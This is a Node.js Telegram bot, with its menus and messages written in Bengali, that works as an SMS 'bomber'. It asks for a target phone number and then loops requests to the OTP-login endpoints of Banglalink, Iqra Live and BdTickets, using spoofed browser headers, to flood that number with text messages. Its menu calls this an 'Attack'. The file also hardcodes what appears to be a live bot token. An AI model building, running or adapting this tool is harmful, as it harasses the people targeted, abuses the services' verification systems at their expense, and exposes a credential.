const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const channelId = '@srmtelecom';
const bot = new TelegramBot(token, {polling: true});
const userStates = {};

// Render সচল রাখতে
http.createServer((req, res) => { res.write("S.R.M TELECOM BL-Power Active!"); res.end(); }).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Triple API Mode) চালু হয়েছে...");

const mainMenu = { reply_markup: { keyboard: [[{ text: '🚀 শুরু করুন (Attack)' }], [{ text: '📢 চ্যানেল জয়েন' }]], resize_keyboard: true } };

async function isSubscribed(chatId) {
    try { const res = await bot.getChatMember(channelId, chatId); return ['member', 'administrator', 'creator'].includes(res.status); } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start') {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nচ্যানেলে জয়েন করে আবার /start দিন।\n📢 লিংক: https://t.me/srmtelecom`, { parse_mode: "Markdown" });
    }

    if (text === '/start') { bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nবাংলালিংক ও অন্যান্য এপিআই এখন সচল।", mainMenu); }

    else if (text === '🚀 শুরু করুন (Attack)') {
        userStates[chatId] = { step: 'num' };
        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন:**", { reply_markup: { remove_keyboard: true } });
    }

    else if (userStates[chatId]?.step === 'num' && text.length === 11) {
        userStates[chatId] = { step: 'amount', number: text };
        bot.sendMessage(chatId, `🔢 **কয়টি SMS লুপ? (১-৩০)**`);
    }

    else if (userStates[chatId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি দিন।");
        const target = userStates[chatId].number;
        delete userStates[chatId];

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে ট্রিপল এপিআই অ্যাটাক শুরু...`);

        let success = 0;
        for (let i = 0; i < amount; i++) {
            // ১. Banglalink API (আপনার দেওয়া নতুন POST API)
            try { 
                await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', 
                { mobile: target }, 
                { headers: { 
                    'Content-Type': 'application/json',
                    'Origin': 'https://www.banglalink.net',
                    'Referer': 'https://www.banglalink.net/',
                    'User-Agent': 'Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36'
                }, timeout: 5000 }); 
                success++; 
            } catch (e) {}

            // ২. Iqra Live (GET)
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 4000 }); success++; } catch (e) {}

            // ৩. BdTickets (POST)
            try { 
                await axios.post('https://api.bdtickets.com:20100/v1/auth', 
                { createUserCheck: true, phoneNumber: "+88" + target, applicationChannel: "WEB_APP" }, 
                { headers: { 'Content-Type': 'application/json', 'Origin': 'https://bdtickets.com', 'Sec-Ch-Ua-Platform': '"Android"' }, timeout: 4000 }); 
                success++; 
            } catch (e) {}

            // ৪ সেকেন্ড গ্যাপ (সেরা রেজাল্টের জন্য)
            await new Promise(r => setTimeout(r, 4000));
        }
        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল হিট: ${success}টি`, mainMenu);
    }
});
